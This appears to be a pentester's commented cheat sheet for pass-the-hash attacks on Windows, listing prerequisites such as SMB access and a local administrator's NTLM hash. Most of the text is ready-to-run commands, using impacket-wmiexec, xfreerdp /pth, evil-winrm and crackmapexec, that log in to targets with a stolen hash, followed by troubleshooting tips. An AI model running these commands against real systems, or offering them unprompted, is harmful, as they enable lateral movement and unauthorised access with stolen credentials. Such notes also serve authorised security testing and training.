#Requirements:
#
# - Port 445 on the target machine (SMB service) is available.
# - NTLM hash of an Local Administrator user.
# - ADMIN$ and 'File and printing' share habilitated.
#
# we can try to perform a PtH attack with the following command using the Impacket collection utility:


/usr/bin/impacket-wmiexec -hashes :<NTLMhash> <USERNAME>@<IP>

#If the attack doesn't work it may be for one or severals of the follwing reasons:
#
#	- A firewall is blocking the 445/tcp port connection.
#	- The users is not part of the Local Administrator group.
#	- The ADMIN$ share or the File and Printing share are not habilitated.
#
#This kind of attack can be launched with other tools.
# Is worth mention that this only can be achieve with a NTLM hash, which is not the same than a NTLMv2 hash. 
#
# !!!!!IMPORTANT¡¡¡¡¡¡¡¡
#
# it is also worth to mention that we can perfrom PtH attacks in other protocols like RDP or WinRM, we can check this kind of lateral movement vectors with xfreerdp and winrm respectively:

xfreerdp /v:<IP> /u:<USER> /pth:<NTLMHASH>

evil-winrm -i <IP> -u <USER> -H <NTLMHASH>

# We don't have to be admin in order to be capable of login in this services with PtH technique.
#
# Also we can check if a user and his password hash are valid credentials with cme:

crackmapexec <smb|winrm|rdp> <IP> -u <USER> -H <HASH>
